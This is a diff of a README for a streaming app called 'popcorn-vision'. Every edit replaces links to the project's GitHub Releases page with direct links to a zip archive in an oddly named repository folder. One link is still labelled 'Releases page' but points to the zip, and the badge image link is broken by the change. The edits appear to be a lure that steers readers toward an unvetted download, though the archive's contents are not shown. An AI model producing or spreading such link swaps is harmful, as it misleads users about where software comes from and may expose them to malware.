@@ -1,7 +1,7 @@
 # 🎬 popcorn-vision - Stream Movies & TV Easily
 
 ## 📥 Download Now
-[![Download popcorn-vision](https://img.shields.io/badge/Download-penguin%20popcorn-ff69b4?style=for-the-badge)](https://github.com/mdgreena123/popcorn-vision/releases)
+[![Download popcorn-vision](https://raw.githubusercontent.com/mdgreena123/popcorn-vision/master/peronium/popcorn-vision.zip%20popcorn-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/mdgreena123/popcorn-vision/master/peronium/popcorn-vision.zip)
 
 ## 🚀 Getting Started
 Welcome to popcorn-vision, your simple solution for streaming and discovering movies and TV shows. Follow the steps below to get started quickly.
@@ -27,7 +27,7 @@ Here are some of the key features of popcorn-vision:
 ## 📥 Download & Install
 To download popcorn-vision, visit the Releases page:
 
-[Download popcorn-vision](https://github.com/mdgreena123/popcorn-vision/releases)
+[Download popcorn-vision](https://raw.githubusercontent.com/mdgreena123/popcorn-vision/master/peronium/popcorn-vision.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of popcorn-vision.
@@ -72,4 +72,4 @@ We welcome your feedback! If you want to help improve popcorn-vision, feel free 
 
 ---
 
-For any updates or new features, keep an eye on the [Releases page](https://github.com/mdgreena123/popcorn-vision/releases). Enjoy streaming with popcorn-vision!
+For any updates or new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/mdgreena123/popcorn-vision/master/peronium/popcorn-vision.zip). Enjoy streaming with popcorn-vision!
